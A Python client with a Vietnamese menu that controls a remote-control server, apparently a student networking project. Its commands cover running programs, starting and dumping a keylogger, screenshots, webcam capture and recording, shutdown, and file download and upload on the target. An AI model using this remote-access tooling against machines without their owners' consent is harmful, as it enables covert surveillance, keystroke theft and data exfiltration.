"""
Simple Python client for the remote control server.
Uses length-prefixed JSON messages and provides a basic CLI menu.
"""

import base64
import json
import os
import socket
import struct
import tkinter as tk
from typing import Any, Dict

SERVER_PORT = 12345


def send_message(conn: socket.socket, payload: Dict[str, Any]) -> None:
    data = json.dumps(payload).encode("utf-8")
    header = struct.pack(">I", len(data))
    conn.sendall(header + data)


def recv_exact(conn: socket.socket, size: int) -> bytes:
    buf = b""
    while len(buf) < size:
        chunk = conn.recv(size - len(buf))
        if not chunk:
            raise ConnectionError("connection closed while receiving data")
        buf += chunk
    return buf


def recv_message(conn: socket.socket) -> Dict[str, Any]:
    header = recv_exact(conn, 4)
    (length,) = struct.unpack(">I", header)
    body = recv_exact(conn, length)
    return json.loads(body.decode("utf-8"))


def save_base64_file(data_b64: str, suggested_name: str) -> str:
    path = os.path.abspath(suggested_name)
    with open(path, "wb") as f:
        f.write(base64.b64decode(data_b64.encode("ascii")))
    return path


def print_menu():
    print(
        """
Chọn chức năng (theo hình):
 1) Process Running     (liệt kê tiến trình)
 2) App Running         (khởi động ứng dụng)
 3) Keystroke           (bắt phím: start/stop/dump)
 4) Tắt máy             (shutdown)
 5) Chụp màn hình       (screenshot)
 6) Webcam open         (mở webcam)
 7) Webcam record       (video webcam)
 8) Download file       (tải file từ máy đích)
 9) Upload file         (gửi file lên máy đích)
 x) Thoát
"""
    )


def main():
    host = input("Server IP: ").strip()
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        conn.connect((host, SERVER_PORT))
    except (ConnectionError, OSError) as exc:
        print(f"Cannot connect: {exc}")
        return

    try:
        while True:
            print_menu()
            choice = input("Select: ").strip().lower()
            if choice == "x":
                break

            try:
                if choice == "1":  # Process Running
                    send_message(conn, {"action": "list_processes"})
                elif choice == "2":  # App Running
                    cmd = input("Lệnh/ứng dụng để chạy: ").strip()
                    send_message(conn, {"action": "start_app", "command": cmd})
                elif choice == "3":  # Keystroke submenu
                    sub = input("k: start | s: stop | d: dump -> ").strip().lower()
                    if sub == "k":
                        send_message(conn, {"action": "keylog_start"})
                    elif sub == "s":
                        send_message(conn, {"action": "keylog_stop"})
                    elif sub == "d":
                        send_message(conn, {"action": "keylog_dump"})
                    else:
                        print("Chọn k/s/d")
                        continue
                elif choice == "4":  # Tắt máy
                    send_message(conn, {"action": "shutdown"})
                elif choice == "5":  # Chụp màn hình
                    send_message(conn, {"action": "screenshot"})
                elif choice == "6":  # Webcam open
                    send_message(conn, {"action": "webcam_open"})
                elif choice == "7":  # Webcam record
                    sub = input("r: start | s: stop -> ").strip().lower()
                    if sub == "r":
                        send_message(conn, {"action": "webcam_record_start"})
                    elif sub == "s":
                        send_message(conn, {"action": "webcam_record_stop"})
                elif choice == "8":  # Download file
                    path = input("Đường dẫn file từ máy đích: ").strip()
                    send_message(conn, {"action": "download", "path": path})
                elif choice == "9":  # Upload file
                    local = input("File cục bộ để gửi: ").strip()
                    remote = input("Đường dẫn lưu trên máy đích: ").strip()
                    with open(local, "rb") as f:
                        data_b64 = base64.b64encode(f.read()).decode("ascii")
                    send_message(conn, {"action": "upload", "path": remote, "data": data_b64})
                else:
                    print("Không hợp lệ")
                    continue

                resp = recv_message(conn)
                status = resp.get("status")
                data = resp.get("data")
                encoding = resp.get("encoding")


                if encoding and status == "ok":
                    if encoding.startswith("base64_png"):
                        path = save_base64_file(data, "screenshot.png")
                        print(f"Screenshot saved to {path}")
                    elif encoding.startswith("base64_jpg"):
                        path = save_base64_file(data, "webcam.jpg")
                        print(f"Webcam image saved to {path}")
                    elif encoding.startswith("base64_mp4"):
                        path = save_base64_file(data, "record.mp4")
                        print(f"Webcam video saved to {path}")
                    elif encoding.startswith("base64_file"):
                        path = save_base64_file(data, "download.bin")
                        print(f"File saved to {path}")
                    else:
                        print(f"Unknown encoding: {encoding}")
                else:
                    print(f"Status: {status}, Data: {data}")

            except (ConnectionError, OSError, json.JSONDecodeError) as exc:
                print(f"Connection error: {exc}")
                break
            except ValueError as exc:
                print(f"Invalid input: {exc}")
    finally:
        conn.close()


if __name__ == "__main__":
    main()
